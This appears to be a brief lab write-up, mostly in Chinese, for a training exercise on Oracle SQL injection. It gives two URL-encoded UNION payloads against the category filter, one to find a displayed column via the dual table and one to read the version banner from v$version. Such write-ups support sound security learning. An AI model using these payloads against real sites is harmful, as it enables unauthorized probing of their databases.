# Lab: SQL injection attack, querying the database type and version on Oracle

This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

## SQL injection
* 題目說資料庫用的是 `Oracle`，需要注意一下在 `Oracle` 中 `select` 語句必須包含 `from`，如果未指定來源的話，可以用 `dual` 表，內建的，在 hint 裡面也有說
* 注入點在 `category`
* 題目說要拿資料庫的版本，首先要確定哪一個 column 可以輸出在網頁上
```
// 看哪一個 column 可以輸出在網頁上
payload = %27%20union%20select%20NULL,%271%27%20from%20dual%20--%20-
```
```
// 拿版本
payload = %27%20union%20select%20NULL,banner%20FROM%20v$version%20%20--%20-
```